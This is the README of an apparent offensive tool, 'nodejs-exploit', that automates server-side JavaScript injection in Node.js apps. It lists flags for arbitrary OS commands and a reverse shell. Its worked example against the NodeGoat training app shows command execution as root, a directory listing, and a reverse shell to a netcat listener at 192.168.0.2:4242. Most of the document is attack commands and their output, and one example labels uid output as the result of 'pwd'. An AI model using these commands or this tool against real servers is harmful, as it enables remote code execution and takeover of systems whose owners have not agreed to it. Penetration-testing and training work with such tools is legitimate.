# nodejs-exploit
Server-side javascript code injection

[![Python 3.4|3.8](https://img.shields.io/badge/python-3.4|3.8-green.svg)](https://www.python.org/) [![License](https://img.shields.io/github/license/nbeguier/nodejs-exploit?color=blue)](https://github.com/nbeguier/nodejs-exploit/blob/master/LICENSE)

## Prerequisites

```bash
pip3 install -r requirements.txt
```

## Usage

```
usage: exploit.py [-h] [--version] [-u URL] [-H HEADERS [HEADERS ...]] [-p P]
                  [-d DATA] [-X METHOD] [--os-command OS_COMMAND]
                  [--reverse-shell] [--disable-checks]

optional arguments:
  -h, --help            show this help message and exit
  --version             show program's version number and exit
  -u URL, --url URL     URL to exploit
  -H HEADERS [HEADERS ...], --headers HEADERS [HEADERS ...]
                        headers
  -p P                  vulnerable parameter
  -d DATA, --data DATA  data payload
  -X METHOD, --method METHOD
                        request method
  --os-command OS_COMMAND
                        custom os command
  --reverse-shell       run reverse shell
  --disable-checks      disable exploit checks
```


## Example

  - Follow nodegoat tutorial and run it on port 4000

```bash
COOKIE=connect.sid=s%3AefIfbHVrLx0_kcUI7xQZnXfEagFbJvni.u3tbrUb98ti%2Fiw%2BjDyV93iYk13cZWR02euIIqNwNfQA
# Run exploit checks
$ python3 exploit.py --url http://nodegoat.domain.lan:4000/contributions -X POST -H "Cookie: $COOKIE" "Content-Type: application/x-www-form-urlencoded" -p preTax -d 'preTax=0&roth=0&afterTax=0'
"add" possible, seems vulnerable
No reflection with "isFinite"
"hello" possible, seems vulnerable
Output: hello
"ls" possible, seems vulnerable
Output: .dockerignore,.git,.gitignore,.jshintrc,.nodemonignore,.travis.yml,Dockerfile,Gruntfile.js,LICENSE,Procfile,README.md,app,app.json,artifacts,config,cypress.json,docker-compose.yml,node_modules,package-lock.json,package.json,server.js,test

# Execute 'pwd'
$ python3 exploit.py --url http://nodegoat.domain.lan:4000/contributions -X POST -H "Cookie: $COOKIE" "Content-Type: application/x-www-form-urlencoded" -p preTax -d 'preTax=0&roth=0&afterTax=0' --disable-checks --os-command 'pwd'
Output: uid=0(root) gid=0(root) groupes=0(root)


# Execute a reverse shell ('nc -l -p 4242' in another terminal)
$ python3 exploit.py --url http://nodegoat.domain.lan:4000/contributions -X POST -H "Cookie: $COOKIE" "Content-Type: application/x-www-form-urlencoded" -p preTax -d 'preTax=0&roth=0&afterTax=0' --disable-checks --reverse-shell
[Reverse shell] Host: 192.168.0.2
[Reverse shell] Port: 4242
"reverse shell" possible, seems vulnerable
# your netcat is acting like a shell on the nodejs instance


$ python3 exploit.py --url http://nodegoat.domain.lan:4000/allocations/4?threshold=3 -H "Cookie: $COOKIE" -p threshold
Error during "add" test
Error during "isFinite" test
Error during "hello" test
Error during "ls" test
"sleep5" possible, seems vulnerable
Error during "sleep5" test
```

# License
Licensed under the [MIT License](https://github.com/nbeguier/nodejs-exploit/blob/master/LICENSE).

# Copyright
Copyright 2020 Nicolas BÃ©guier; ([nbeguier](https://beguier.eu/nicolas/) - nicolas_beguier[at]hotmail[dot]com)
